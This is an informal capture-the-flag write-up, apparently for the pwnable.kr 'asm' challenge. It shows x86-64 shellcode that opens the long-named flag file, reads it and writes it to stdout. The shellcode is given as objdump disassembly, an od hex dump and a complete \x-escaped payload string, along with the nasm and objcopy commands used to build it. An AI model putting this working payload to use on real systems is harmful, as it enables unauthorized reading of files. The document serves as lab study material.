from internet i found shellcode for reading/writing to stdout /etc/passwd

i modified it to read/write the flag file

i used nasm to compile my asm

~~~
nasm -f elf64 shellcode.asm
~~~

we could see the shellcode content like this
~~~
ld -o shellcoder shellcode.o
objdump -d shellcoder

shellcoder:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 42                	jmp    4000c4 <_push_filename>

0000000000400082 <_readfile>:
  400082:	5f                   	pop    %rdi
  400083:	80 b7 e8 00 00 00 41 	xorb   $0x41,0xe8(%rdi)
  40008a:	48 31 c0             	xor    %rax,%rax
  40008d:	04 02                	add    $0x2,%al
  40008f:	48 31 f6             	xor    %rsi,%rsi
  400092:	0f 05                	syscall 
  400094:	66 81 ec ff 0f       	sub    $0xfff,%sp
  400099:	48 8d 34 24          	lea    (%rsp),%rsi
  40009d:	48 89 c7             	mov    %rax,%rdi
  4000a0:	48 31 d2             	xor    %rdx,%rdx
  4000a3:	66 ba ff 0f          	mov    $0xfff,%dx
  4000a7:	48 31 c0             	xor    %rax,%rax
  4000aa:	0f 05                	syscall 
  4000ac:	48 31 ff             	xor    %rdi,%rdi
  4000af:	40 80 c7 01          	add    $0x1,%dil
  4000b3:	48 89 c2             	mov    %rax,%rdx
  4000b6:	48 31 c0             	xor    %rax,%rax
  4000b9:	04 01                	add    $0x1,%al
  4000bb:	0f 05                	syscall 
  4000bd:	48 31 c0             	xor    %rax,%rax
  4000c0:	04 3c                	add    $0x3c,%al
  4000c2:	0f 05                	syscall 

00000000004000c4 <_push_filename>:
  4000c4:	e8 b9 ff ff ff       	callq  400082 <_readfile>

00000000004000c9 <path>:
  4000c9:	74 68                	je     400133 <path+0x6a>
  4000cb:	69 73 5f 69 73 5f 70 	imul   $0x705f7369,0x5f(%rbx),%esi
  4000d2:	77 6e                	ja     400142 <path+0x79>
  4000d4:	61                   	(bad)  
  4000d5:	62                   	(bad)  
  4000d6:	6c                   	insb   (%dx),%es:(%rdi)
  4000d7:	65 2e 6b 72 5f 66    	gs imul $0x66,%cs:0x5f(%rdx),%esi
  4000dd:	6c                   	insb   (%dx),%es:(%rdi)
  4000de:	61                   	(bad)  
  4000df:	67 5f                	addr32 pop %rdi
  4000e1:	66 69 6c 65 5f 70 6c 	imul   $0x6c70,0x5f(%rbp,%riz,2),%bp
  4000e8:	65 61                	gs (bad) 
  4000ea:	73 65                	jae    400151 <path+0x88>
  4000ec:	5f                   	pop    %rdi
  4000ed:	72 65                	jb     400154 <path+0x8b>
  4000ef:	61                   	(bad)  
  4000f0:	64 5f                	fs pop %rdi
  4000f2:	74 68                	je     40015c <path+0x93>
  4000f4:	69 73 5f 66 69 6c 65 	imul   $0x656c6966,0x5f(%rbx),%esi
  4000fb:	2e 73 6f             	jae,pn 40016d <path+0xa4>
  4000fe:	72 72                	jb     400172 <path+0xa9>
  400100:	79 5f                	jns    400161 <path+0x98>
  400102:	74 68                	je     40016c <path+0xa3>
  400104:	65 5f                	gs pop %rdi
  400106:	66 69 6c 65 5f 6e 61 	imul   $0x616e,0x5f(%rbp,%riz,2),%bp
  40010d:	6d                   	insl   (%dx),%es:(%rdi)
  40010e:	65 5f                	gs pop %rdi
  400110:	69 73 5f 76 65 72 79 	imul   $0x79726576,0x5f(%rbx),%esi
  400117:	5f                   	pop    %rdi
  400118:	6c                   	insb   (%dx),%es:(%rdi)
  400119:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40011f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400120:	6f                   	outsl  %ds:(%rsi),(%dx)
  400121:	6f                   	outsl  %ds:(%rsi),(%dx)
  400122:	6f                   	outsl  %ds:(%rsi),(%dx)
  400123:	6f                   	outsl  %ds:(%rsi),(%dx)
  400124:	6f                   	outsl  %ds:(%rsi),(%dx)
  400125:	6f                   	outsl  %ds:(%rsi),(%dx)
  400126:	6f                   	outsl  %ds:(%rsi),(%dx)
  400127:	6f                   	outsl  %ds:(%rsi),(%dx)
  400128:	6f                   	outsl  %ds:(%rsi),(%dx)
  400129:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40012f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400130:	6f                   	outsl  %ds:(%rsi),(%dx)
  400131:	6f                   	outsl  %ds:(%rsi),(%dx)
  400132:	6f                   	outsl  %ds:(%rsi),(%dx)
  400133:	6f                   	outsl  %ds:(%rsi),(%dx)
  400134:	6f                   	outsl  %ds:(%rsi),(%dx)
  400135:	6f                   	outsl  %ds:(%rsi),(%dx)
  400136:	6f                   	outsl  %ds:(%rsi),(%dx)
  400137:	6f                   	outsl  %ds:(%rsi),(%dx)
  400138:	6f                   	outsl  %ds:(%rsi),(%dx)
  400139:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40013f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400140:	6f                   	outsl  %ds:(%rsi),(%dx)
  400141:	6f                   	outsl  %ds:(%rsi),(%dx)
  400142:	6f                   	outsl  %ds:(%rsi),(%dx)
  400143:	6f                   	outsl  %ds:(%rsi),(%dx)
  400144:	6f                   	outsl  %ds:(%rsi),(%dx)
  400145:	6f                   	outsl  %ds:(%rsi),(%dx)
  400146:	6f                   	outsl  %ds:(%rsi),(%dx)
  400147:	6f                   	outsl  %ds:(%rsi),(%dx)
  400148:	6f                   	outsl  %ds:(%rsi),(%dx)
  400149:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40014f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400150:	6f                   	outsl  %ds:(%rsi),(%dx)
  400151:	6f                   	outsl  %ds:(%rsi),(%dx)
  400152:	6f                   	outsl  %ds:(%rsi),(%dx)
  400153:	6f                   	outsl  %ds:(%rsi),(%dx)
  400154:	6f                   	outsl  %ds:(%rsi),(%dx)
  400155:	6f                   	outsl  %ds:(%rsi),(%dx)
  400156:	6f                   	outsl  %ds:(%rsi),(%dx)
  400157:	6f                   	outsl  %ds:(%rsi),(%dx)
  400158:	6f                   	outsl  %ds:(%rsi),(%dx)
  400159:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40015f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400160:	6f                   	outsl  %ds:(%rsi),(%dx)
  400161:	6f                   	outsl  %ds:(%rsi),(%dx)
  400162:	6f                   	outsl  %ds:(%rsi),(%dx)
  400163:	6f                   	outsl  %ds:(%rsi),(%dx)
  400164:	6f                   	outsl  %ds:(%rsi),(%dx)
  400165:	30 30                	xor    %dh,(%rax)
  400167:	30 30                	xor    %dh,(%rax)
  400169:	30 30                	xor    %dh,(%rax)
  40016b:	30 30                	xor    %dh,(%rax)
  40016d:	30 30                	xor    %dh,(%rax)
  40016f:	30 30                	xor    %dh,(%rax)
  400171:	30 30                	xor    %dh,(%rax)
  400173:	30 30                	xor    %dh,(%rax)
  400175:	30 30                	xor    %dh,(%rax)
  400177:	30 30                	xor    %dh,(%rax)
  400179:	30 30                	xor    %dh,(%rax)
  40017b:	30 30                	xor    %dh,(%rax)
  40017d:	30 6f 6f             	xor    %ch,0x6f(%rdi)
  400180:	6f                   	outsl  %ds:(%rsi),(%dx)
  400181:	6f                   	outsl  %ds:(%rsi),(%dx)
  400182:	6f                   	outsl  %ds:(%rsi),(%dx)
  400183:	6f                   	outsl  %ds:(%rsi),(%dx)
  400184:	6f                   	outsl  %ds:(%rsi),(%dx)
  400185:	6f                   	outsl  %ds:(%rsi),(%dx)
  400186:	6f                   	outsl  %ds:(%rsi),(%dx)
  400187:	6f                   	outsl  %ds:(%rsi),(%dx)
  400188:	6f                   	outsl  %ds:(%rsi),(%dx)
  400189:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018a:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018b:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018d:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018e:	6f                   	outsl  %ds:(%rsi),(%dx)
  40018f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400190:	6f                   	outsl  %ds:(%rsi),(%dx)
  400191:	6f                   	outsl  %ds:(%rsi),(%dx)
  400192:	6f                   	outsl  %ds:(%rsi),(%dx)
  400193:	6f                   	outsl  %ds:(%rsi),(%dx)
  400194:	6f                   	outsl  %ds:(%rsi),(%dx)
  400195:	30 30                	xor    %dh,(%rax)
  400197:	30 30                	xor    %dh,(%rax)
  400199:	30 30                	xor    %dh,(%rax)
  40019b:	30 30                	xor    %dh,(%rax)
  40019d:	30 30                	xor    %dh,(%rax)
  40019f:	30 30                	xor    %dh,(%rax)
  4001a1:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001a2:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001a5:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001a6:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001a9:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001aa:	30 6f 30             	xor    %ch,0x30(%rdi)
  4001ad:	6f                   	outsl  %ds:(%rsi),(%dx)
  4001ae:	6e                   	outsb  %ds:(%rsi),(%dx)
  4001af:	67                   	addr32
  4001b0:	41                   	rex.B
~~~

or we could output only the binary like this
~~~
objcopy -O shellcoder -j .text shellcode.o outcode
od -An -t x1 fuck
 eb 42 5f 80 b7 e8 00 00 00 41 48 31 c0 04 02 48
 31 f6 0f 05 66 81 ec ff 0f 48 8d 34 24 48 89 c7
 48 31 d2 66 ba ff 0f 48 31 c0 0f 05 48 31 ff 40
 80 c7 01 48 89 c2 48 31 c0 04 01 0f 05 48 31 c0
 04 3c 0f 05 e8 b9 ff ff ff 74 68 69 73 5f 69 73
 5f 70 77 6e 61 62 6c 65 2e 6b 72 5f 66 6c 61 67
 5f 66 69 6c 65 5f 70 6c 65 61 73 65 5f 72 65 61
 64 5f 74 68 69 73 5f 66 69 6c 65 2e 73 6f 72 72
 79 5f 74 68 65 5f 66 69 6c 65 5f 6e 61 6d 65 5f
 69 73 5f 76 65 72 79 5f 6c 6f 6f 6f 6f 6f 6f 6f
 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f
*
 6f 6f 6f 6f 6f 30 30 30 30 30 30 30 30 30 30 30
 30 30 30 30 30 30 30 30 30 30 30 30 30 30 6f 6f
 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f 6f
 6f 6f 6f 6f 6f 30 30 30 30 30 30 30 30 30 30 30
 30 6f 30 6f 30 6f 30 6f 30 6f 30 6f 30 6f 6e 67
 41
~~~

~~~
\xeb\x42\x5f\x80\xb7\xe8\x00\x00\x00\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xb9\xff\xff\xff\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x41
~~~

/home/asm/this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ongA

nasm -f elf64 shellcode.asm --> shellcode.o generated

objcopy -O binary -j .text shellcode.o shellcode_justbin

od -An -t x1 shellcode_justbin
